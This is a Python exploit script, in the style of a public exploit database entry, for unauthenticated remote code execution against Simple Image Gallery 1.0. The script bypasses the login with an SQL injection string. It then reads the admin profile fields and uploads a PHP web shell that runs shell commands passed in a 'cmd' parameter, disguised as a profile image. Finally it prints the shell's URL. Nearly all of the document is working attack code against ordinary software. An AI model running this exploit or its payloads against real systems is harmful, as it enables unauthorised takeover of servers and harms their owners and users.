# Exploit Title: Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 17.08.2021
# Exploit Author: Tagoletta (Tağmaç)
# Software Link: https://www.sourcecodester.com/php/14903/simple-image-gallery-web-app-using-php-free-source-code.html
# Version: V 1.0
# Tested on: Ubuntu

import requests
import random
import string
import json
from bs4 import BeautifulSoup

url = input("TARGET = ")

if not url.startswith('http://') and not url.startswith('https://'):
    url = "http://" + url
if not url.endswith('/'):
    url = url + "/"

payload= "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"

session = requests.session()

print("Login Bypass")

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "admin' or '1'='1'#", "password": ""}
bypassUser = session.post(request_url, data=post_data)
data = json.loads(bypassUser.text)
status = data["status"]

if status == "success":

    let = string.ascii_lowercase

    shellname = ''.join(random.choice(let) for i in range(15))
    shellname = 'Tago'+shellname+'Letta'

    print("shell name "+shellname)

    print("\nprotecting user")
    request_url = url + "?page=user"
    getHTML = session.get(request_url)
    getHTMLParser = BeautifulSoup(getHTML.text, 'html.parser')

    ids = getHTMLParser.find('input', {'name':'id'}).get("value")
    firstname = getHTMLParser.find('input', {'id':'firstname'}).get("value")
    lastname = getHTMLParser.find('input', {'id':'lastname'}).get("value")
    username = getHTMLParser.find('input', {'id':'username'}).get("value")

    print("\nUser ID : " + ids)
    print("Firsname : " + firstname)
    print("Lasname : " + lastname)
    print("Username : " + username + "\n")

    print("shell uploading")

    request_url = url + "/classes/Users.php?f=save"
    request_headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary9nI3gVmJoEZoZyeA"}
    request_data = "------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+ids+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\n"+firstname+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\n"+lastname+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+username+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA\r\nContent-Disposition: form-data; name=\"img\"; filename=\""+shellname+".php\"\r\nContent-Type: application/octet-stream\r\n\r\n"+payload+"\r\n------WebKitFormBoundary9nI3gVmJoEZoZyeA--\r\n"
    upload = session.post(request_url, headers=request_headers, data=request_data)

    if upload.text == "1":
        print("- OK -")
        req = session.get(url + "/?page=user")
        parser = BeautifulSoup(req.text, 'html.parser')
        find_shell = parser.find('img', {'id':'cimg'})
        print("Shell URL : " + find_shell.get("src") + "?cmd=whoami")
    else:
        print("- NO :( -")
else:
    print("No bypass user")